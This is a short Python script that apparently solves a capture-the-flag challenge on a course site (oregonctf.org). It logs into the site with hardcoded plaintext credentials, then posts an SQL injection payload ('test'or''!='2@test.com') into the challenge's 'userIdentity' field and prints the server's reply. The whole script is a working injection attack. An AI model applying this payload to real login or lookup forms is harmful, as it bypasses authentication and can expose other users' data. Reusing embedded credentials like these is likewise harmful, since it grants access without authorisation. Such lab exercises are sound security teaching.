import requests

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/ffd39cb26727f34cbf9fce3e82b9d703404e99cdef54d2aa745f497abe070b"

sql = "test'or''!='2@test.com"

postData = {"userIdentity":sql}


response2 = session.post(targetUrl, data=postData)

print(response2.text)
